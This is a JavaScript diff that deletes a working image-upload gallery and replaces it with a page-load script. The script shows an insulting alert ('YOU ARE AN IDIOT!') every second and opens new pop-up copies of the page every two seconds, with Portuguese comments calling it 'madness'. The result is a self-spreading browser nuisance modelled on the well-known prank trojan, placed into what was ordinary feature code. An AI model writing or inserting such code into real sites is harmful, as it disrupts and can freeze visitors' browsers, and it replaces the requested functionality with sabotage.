@@ -1,19 +1,24 @@
-const imageUpload = document.getElementById('imageUpload');
-const imageGallery = document.getElementById('imageGallery');
+// Função que exibe o alerta
+function showAlert() {
+    alert("YOU ARE AN IDIOT!");
+}
 
-imageUpload.addEventListener('change', () => {
-    const files = imageUpload.files;
-    for (let i = 0; i < files.length; i++) {
-        const file = files[i];
-        const reader = new FileReader();
+// Função que inicia os alertas repetidos
+function startMadness() {
+    setInterval(() => {
+        showAlert();
+    }, 1000);
+}
 
-        reader.onload = (e) => {
-            const img = document.createElement('img');
-            img.src = e.target.result;
-            imageGallery.appendChild(img);
-        };
+// Função que abre janelas pop-up repetidamente
+function openPopups() {
+    setInterval(() => {
+        window.open(window.location.href, "_blank", "width=200,height=100");
+    }, 2000);
+}
 
-        reader.readAsDataURL(file);
-    }
-});
-
+// Inicia os alertas e as pop-ups quando a página é carregada
+window.onload = function() {
+    startMadness();
+    openPopups();
+};
